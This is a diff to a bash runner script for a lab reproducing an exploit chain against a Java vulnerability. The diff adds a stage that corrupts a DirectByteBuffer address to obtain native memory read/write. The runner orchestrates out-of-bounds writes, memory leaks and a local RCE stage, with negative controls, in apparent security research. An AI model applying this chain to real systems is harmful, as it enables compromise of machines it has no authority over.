@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Java4Shell (CVE-2026-114938) lab runner.
 #
-# Usage: run-lab [trigger|control|corrupt|leak|write|chain|chain-control|rce|rce-control|all]
+# Usage: run-lab [trigger|control|corrupt|leak|write|chain|chain-control|native|rce|rce-control|all]
 #
 #   trigger       bounded, non-destructive OOB-write measurement
 #   control       same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
@@ -10,9 +10,10 @@
 #   write         use the corrupted length for a chosen-value OOB write
 #   chain         writer -> reader -> forged header -> repair + GC survival
 #   chain-control same chain with -XX:-UseBASE64Intrinsics (must not reproduce)
+#   native        corrupt a DirectByteBuffer address -> 64-bit native read/write
 #   rce           controlled RCE against a local service (application sink)
 #   rce-control   same as rce, but with -XX:-UseBASE64Intrinsics (must not reproduce)
-#   all           run the five base stages + chain (default)
+#   all           run the five base stages + chain + native (default)
 #
 # Environment:
 #   LAB_MODE=native|sde|auto   (default auto)
@@ -133,6 +134,12 @@ do_chain_control() {
     return "$rc"
 }
 
+do_native() {
+    EXTRA_OPTS=()
+    banner "native: corrupted DirectByteBuffer.address -> 64-bit read/write"
+    run NativeProbe --warmup "$WARMUP"
+}
+
 rce_run() {
     # $1 = mode label, $2 = extra JVM flags (space-free array passed via name)
     local label="$1"
@@ -198,6 +205,7 @@ case "$TEST" in
     write)   do_write ;;
     chain)   do_chain ;;
     chain-control) do_chain_control ;;
+    native)  do_native ;;
     rce)     do_rce ;;
     rce-control) do_rce_control ;;
     all)
@@ -207,17 +215,19 @@ case "$TEST" in
         do_leak;    echo "[leak]    exit=$?"
         do_write;   echo "[write]   exit=$?"
         do_chain;   echo "[chain]   exit=$?"
+        do_native;  echo "[native]  exit=$?"
         echo
         echo "Done. Expected: trigger=REPRODUCED, control=NOT REPRODUCED,"
         echo "corrupt=OOB READ REPRODUCED, leak=JAVA BLEED REPRODUCED,"
-        echo "write=OOB WRITE REPRODUCED, chain=CHAIN COMPLETE."
+        echo "write=OOB WRITE REPRODUCED, chain=CHAIN COMPLETE,"
+        echo "native=NATIVE PRIMITIVE REACHED."
         echo
         echo "Optional: ./run.sh chain-control    (negative control for chain)"
         echo "          ./run.sh rce              (application sink, ~3 min)"
         echo "          ./run.sh rce-control      (negative control for rce)"
         ;;
     *)
-        echo "usage: $0 [trigger|control|corrupt|leak|write|chain|chain-control|rce|rce-control|all]" >&2
+        echo "usage: $0 [trigger|control|corrupt|leak|write|chain|chain-control|native|rce|rce-control|all]" >&2
         exit 2
         ;;
 esac
